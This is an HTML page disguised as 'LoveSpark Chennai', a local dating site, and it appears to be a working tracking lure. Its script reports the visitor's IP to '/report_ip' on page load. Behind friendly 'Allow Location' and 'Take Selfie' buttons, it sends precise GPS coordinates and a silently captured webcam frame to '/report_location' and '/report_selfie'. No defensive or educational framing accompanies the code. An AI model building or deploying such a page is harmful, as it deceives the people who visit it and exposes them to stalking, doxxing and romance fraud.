<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>LoveSpark Chennai - Meet Your Match</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(#ff99cc, #ffe6f0);
      min-height: 100vh;
    }
    .logo {
      font-size: 2.5rem;
      color: #cc0066;
      font-weight: bold;
      letter-spacing: 2px;
    }
    .chennai-theme {
      font-size: 1.2rem;
      color: #ff4da6;
      margin-bottom: 10px;
    }
    .profile-prompt {
      background: #fff0f6;
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 30px;
      box-shadow: 0 2px 8px rgba(204,0,102,0.08);
    }
    .btn-custom {
      background-color: #ff4da6;
      color: white;
      border-radius: 5px;
      margin: 10px;
      font-size: 18px;
      padding: 10px 20px;
      border: none;
    }
    .btn-custom:hover {
      background-color: #cc0066;
    }
    #video {
      display: none;
      margin-top: 20px;
      width: 240px;
      height: 180px;
      border-radius: 10px;
    }
    .dating-photos img {
      border-radius: 10px;
      margin: 10px;
      width: 180px;
      height: 120px;
      object-fit: cover;
      box-shadow: 0 2px 8px rgba(204,0,102,0.12);
    }
  </style>
</head>
<body>
  <div class="container py-5">
    <div class="text-center mb-4">
      <span class="logo">❤️ LoveSpark Chennai</span>
      <div class="chennai-theme">Find singles near Marina Beach, T-Nagar, and more!</div>
    </div>
    <div class="dating-photos text-center mb-4">
      <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=400&q=80" alt="Couple 1">
      <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=400&q=80" alt="Couple 2">
      <img src="https://images.unsplash.com/photo-1465101046530-73398c7f28ca?auto=format&fit=crop&w=400&q=80" alt="Couple 3">
    </div>
    <div class="profile-prompt text-center">
      <h4>Create your profile to get started</h4>
      <p>Share your details and photo to find matches nearby.</p>
    </div>
    <form id="registerForm" class="mb-4" enctype="multipart/form-data">
      <div class="row mb-3">
        <div class="col-md-6 mb-2">
          <input type="text" class="form-control" name="name" placeholder="Your Name" required>
        </div>
        <div class="col-md-3 mb-2">
          <input type="number" class="form-control" name="age" placeholder="Age" min="18" required>
        </div>
        <div class="col-md-3 mb-2">
          <select class="form-control" name="gender" required>
            <option value="">Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
            <option value="Other">Other</option>
          </select>
        </div>
      </div>
      <div class="mb-3">
        <input type="text" class="form-control" name="interests" placeholder="Interests (comma separated)" required>
      </div>
      <div class="mb-3">
        <textarea class="form-control" name="bio" rows="2" placeholder="Short Bio" required></textarea>
      </div>
      <div class="mb-3">
        <label class="form-label">Profile Photo</label>
        <input type="file" class="form-control" name="photo" accept="image/*" required>
      </div>
      <button type="submit" class="btn btn-custom w-100">Register</button>
    </form>
    <div class="text-center">
      <button class="btn btn-custom" onclick="shareLocation()">Allow Location</button>
      <button class="btn btn-custom" onclick="captureSelfie()">Take Selfie</button>
      <video id="video" autoplay playsinline></video>
      <canvas id="canvas" style="display:none;"></canvas>
    </div>
  </div>
  <script>
    fetch("/report_ip", { method: "POST" });

    function shareLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
          fetch("/report_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude
            })
          });
        }, function(err) {
          alert("Location access denied.");
        }, { enableHighAccuracy: true });
      } else {
        alert("Geolocation not supported.");
      }
    }

    async function captureSelfie() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.style.display = "block";
      video.srcObject = stream;

      setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const image = canvas.toDataURL("image/jpeg");

        fetch("/report_selfie", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image })
        });

        stream.getTracks().forEach(track => track.stop());
        video.style.display = "none";
      }, 3000);
    }

    // Registration form submission
    document.getElementById('registerForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const form = e.target;
      const formData = new FormData(form);

      const response = await fetch('/register', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        alert('Registration successful! Welcome to LoveSpark.');
        form.reset();
      } else {
        alert('Registration failed. Please try again.');
      }
    });
  </script>
</body>
</html>
